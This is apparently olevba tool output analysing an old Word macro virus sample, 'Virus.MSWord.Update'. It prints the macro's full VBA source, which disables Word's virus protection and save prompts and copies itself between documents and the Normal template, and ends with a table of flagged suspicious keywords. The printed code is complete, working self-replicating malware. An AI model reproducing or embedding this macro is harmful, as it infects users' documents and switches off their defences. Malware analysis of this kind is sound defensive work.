olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Update
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Update - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()

On Error Resume Next
Dim day
Application.EnableCancelKey = 0

JA89 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

UL66 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.SaveNormalPrompt = 0

Options.VirusProtection = 0

Options.ConfirmConversions = 0

If JA89 > 0 And UL66 > 0 Then GoTo NL19

If JA89 = 0 Then

Set TK61 = ActiveDocument.VBProject.VBComponents.Item(1)

HB13 = True

End If

If UL66 = 0 Then

Set TK61 = NormalTemplate.VBProject.VBComponents.Item(1)

LG92 = True

End If

If LG92 <> True And HB13 <> True Then GoTo NL19

If LG92 = True Then TK61.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JA89 - 1))

If HB13 = True Then TK61.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UL66 - 1))

NL19:

day = Now()
 If day = WeekDay(Now()) Then
    MsgBox "Please update Word97"
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

